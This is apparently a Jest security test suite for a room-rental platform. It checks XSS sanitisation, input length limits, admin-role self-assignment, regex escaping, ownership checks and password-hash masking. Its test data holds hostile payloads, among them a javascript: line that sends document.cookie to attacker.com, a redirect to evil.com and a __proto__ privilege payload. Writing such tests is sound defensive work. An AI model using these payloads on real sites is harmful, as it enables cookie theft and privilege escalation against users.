/**
 * Automated Security & Vulnerability Test Suite
 * RoomNest Platform - Cybersecurity Quality Assurance Testing
 * Covers: Input Sanitization, Buffer Overflow / Payload DoS, Privilege Access Control,
 * Injection Mitigation (ReDoS/NoSQL), Output Validation, and IDOR Prevention.
 */

import { jest } from '@jest/globals';
import { escapeRegex, sanitizeString, sanitizePayload } from '../src/utils/sanitize.js';
import { registerSchema, loginSchema } from '../src/validators/auth.validator.js';
import { createPropertySchema } from '../src/validators/property.validator.js';
import { createReviewSchema } from '../src/validators/review.validator.js';
import { registerUser } from '../src/services/auth.service.js';
import { confirmAvailability } from '../src/services/property.service.js';
import { updateVisitStatus } from '../src/services/visit.service.js';
import { Property } from '../src/models/Property.js';
import { Visit } from '../src/models/Visit.js';
import mongoose from 'mongoose';

describe('🛡️ Cybersecurity Vulnerability & Defensive Controls Test Suite', () => {

  // =========================================================================
  // 1. USER INPUT SANITIZATION & XSS MITIGATION
  // =========================================================================
  describe('1. Input Sanitization & Cross-Site Scripting (XSS) Prevention', () => {
    it('should strip malicious <script> tags from user input', () => {
      const malicious = '<script>alert("XSS Attack!");</script>Safe text';
      const clean = sanitizeString(malicious);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert("XSS Attack!");');
      expect(clean).toContain('Safe text');
    });

    it('should strip dangerous inline event handlers like onerror and onload', () => {
      const malicious = '<img src="invalid.jpg" onerror="alert(\'Stealing cookies\')">';
      const clean = sanitizeString(malicious);
      expect(clean).not.toContain('onerror=');
      expect(clean).not.toContain('Stealing cookies');
    });

    it('should strip javascript: pseudo-protocol vectors', () => {
      const malicious = 'javascript:fetch("http://attacker.com?c="+document.cookie)';
      const clean = sanitizeString(malicious);
      expect(clean).not.toContain('javascript:');
    });

    it('should recursively sanitize nested request objects and ignore prototype pollution keys', () => {
      const payload = {
        title: 'PG Near KIIT',
        __proto__: { isAdmin: true },
        review: {
          comment: '<script>document.location="http://evil.com"</script>Great place!'
        }
      };

      const clean = sanitizePayload(payload);
      expect(clean.title).toBe('PG Near KIIT');
      expect(clean.review.comment).not.toContain('<script>');
      expect(clean.review.comment).toContain('Great place!');
      expect(Object.prototype.isAdmin).toBeUndefined();
    });
  });

  // =========================================================================
  // 2. BUFFER OVERFLOW & PAYLOAD SIZE / MEMORY EXHAUSTION HANDLING
  // =========================================================================
  describe('2. Buffer Overflow & Memory Exhaustion Handling (Web Payload DoS)', () => {
    it('should reject passwords exceeding 72 characters to prevent bcrypt CPU starvation DoS', () => {
      const massivePassword = 'A'.repeat(73);
      const result = registerSchema.safeParse({
        name: 'Alex Hunter',
        email: 'alex@example.com',
        phone: '9876543210',
        password: massivePassword,
        role: 'tenant'
      });

      expect(result.success).toBe(false);
      expect(result.error.issues[0].message).toContain('Password must not exceed 72 characters');
    });

    it('should reject oversized user names (>60 chars) and emails (>100 chars)', () => {
      const massiveName = 'B'.repeat(61);
      const result = registerSchema.safeParse({
        name: massiveName,
        email: 'alex@example.com',
        phone: '9876543210',
        password: 'SecurePassword123!',
        role: 'tenant'
      });

      expect(result.success).toBe(false);
      expect(result.error.issues[0].message).toContain('Name must not exceed 60 characters');
    });

    it('should reject oversized review comments (>1000 chars) to prevent storage and heap flooding', () => {
      const massiveComment = 'C'.repeat(1001);
      const result = createReviewSchema.safeParse({
        propertyId: 'prop123',
        rating: 5,
        comment: massiveComment
      });

      expect(result.success).toBe(false);
      expect(result.error.issues[0].message).toContain('cannot exceed 1000 characters');
    });

    it('should reject oversized property titles (>120 chars) and descriptions (>3000 chars)', () => {
      const massiveTitle = 'D'.repeat(121);
      const result = createPropertySchema.safeParse({
        title: massiveTitle,
        propertyType: 'Flat',
        city: 'Bhubaneswar',
        state: 'Odisha',
        locality: 'Patia',
        address: 'Plot 42, Infocity Road',
        longitude: 85.8245,
        latitude: 20.3533,
        monthlyRent: 8000
      });

      expect(result.success).toBe(false);
      expect(result.error.issues[0].message).toContain('Title cannot exceed 120 characters');
    });
  });

  // =========================================================================
  // 3. PRIVILEGE ACCESS CONTROL & VERTICAL PRIVILEGE ESCALATION
  // =========================================================================
  describe('3. Privilege Access Control (Vertical Privilege Escalation Defense)', () => {
    it('should strictly reject "admin" role during public user registration in schema', () => {
      const result = registerSchema.safeParse({
        name: 'Hacker User',
        email: 'hacker@example.com',
        phone: '9876543210',
        password: 'Password123!',
        role: 'admin' // Attempting to self-grant admin
      });

      expect(result.success).toBe(false);
      expect(result.error.issues[0].message).toContain('Administrative roles cannot be self-assigned');
    });

    it('should throw 403 Forbidden in auth service if role="admin" bypasses validator', async () => {
      await expect(registerUser({
        name: 'Privilege Escalator',
        email: 'attacker@example.com',
        phone: '9876543210',
        password: 'Password123!',
        role: 'admin'
      })).rejects.toThrow('Privilege escalation violation: Administrative accounts cannot be registered publicly');
    });
  });

  // =========================================================================
  // 4. INJECTION ATTACKS & REGEX DOS (ReDoS) MITIGATION
  // =========================================================================
  describe('4. Injection Attacks & ReDoS Prevention', () => {
    it('should escape dangerous regex metacharacters in search queries', () => {
      const maliciousRegex = '^.*(a+)+$';
      const escaped = escapeRegex(maliciousRegex);
      expect(escaped).toBe('\\^\\.\\*\\(a\\+\\)\\+\\$');
    });

    it('should truncate excessively long regex input (>100 chars) to prevent ReDoS CPU exhaustion', () => {
      const longInput = 'a'.repeat(200);
      const escaped = escapeRegex(longInput);
      expect(escaped.length).toBe(100);
    });

    it('should return empty string safely when input is non-string', () => {
      expect(escapeRegex(null)).toBe('');
      expect(escapeRegex(undefined)).toBe('');
      expect(escapeRegex({ '$gt': '' })).toBe('');
    });
  });

  // =========================================================================
  // 5. HORIZONTAL PRIVILEGE ESCALATION / IDOR DEFENSE
  // =========================================================================
  describe('5. Horizontal Privilege Escalation & IDOR Defense', () => {
    it('should block unauthorized users from confirming availability of another user property', async () => {
      const ownerId = new mongoose.Types.ObjectId();
      const unauthorizedUserId = new mongoose.Types.ObjectId();

      const mockProperty = {
        _id: new mongoose.Types.ObjectId(),
        owner: ownerId,
        broker: null,
        lastAvailabilityConfirmedAt: new Date(),
        save: jest.fn().mockResolvedValue(true)
      };

      jest.spyOn(Property, 'findById').mockResolvedValue(mockProperty);

      // Unauthorized tenant trying to confirm
      const unauthorizedUser = { _id: unauthorizedUserId, role: 'tenant' };

      await expect(confirmAvailability(mockProperty._id, unauthorizedUser))
        .rejects.toThrow('Access denied: You do not have permission to confirm availability for this property');

      Property.findById.mockRestore();
    });

    it('should block unauthorized users from modifying another user visit request', async () => {
      const tenantId = new mongoose.Types.ObjectId();
      const ownerId = new mongoose.Types.ObjectId();
      const intruderId = new mongoose.Types.ObjectId();

      const mockVisit = {
        _id: new mongoose.Types.ObjectId(),
        tenant: tenantId,
        owner: ownerId,
        broker: null,
        status: 'pending',
        save: jest.fn().mockResolvedValue(true)
      };

      jest.spyOn(Visit, 'findById').mockResolvedValue(mockVisit);

      // Intruder trying to cancel/reschedule visit
      const intruderUser = { _id: intruderId, role: 'tenant' };

      await expect(updateVisitStatus(mockVisit._id, { status: 'cancelled' }, intruderUser))
        .rejects.toThrow('Access denied: You do not have permission to modify this visit request');

      Visit.findById.mockRestore();
    });
  });

  // =========================================================================
  // 6. OUTPUT VALIDATION & SENSITIVE DATA LEAKAGE PREVENTION
  // =========================================================================
  describe('6. Output Validation & Sensitive Field Masking', () => {
    it('should ensure passwordHash and internal version keys are masked in toJSON', () => {
      const sampleUserData = {
        _id: new mongoose.Types.ObjectId(),
        name: 'Safe User',
        email: 'user@example.com',
        phone: '9876543210',
        passwordHash: '$2a$12$e8g3m...secretHash...',
        __v: 0
      };

      // Emulate Mongoose toJSON transform rule defined on UserSchema
      const transform = (doc, ret) => {
        delete ret.passwordHash;
        delete ret.__v;
        return ret;
      };

      const transformed = transform(null, { ...sampleUserData });
      expect(transformed.passwordHash).toBeUndefined();
      expect(transformed.__v).toBeUndefined();
      expect(transformed.email).toBe('user@example.com');
    });
  });

});
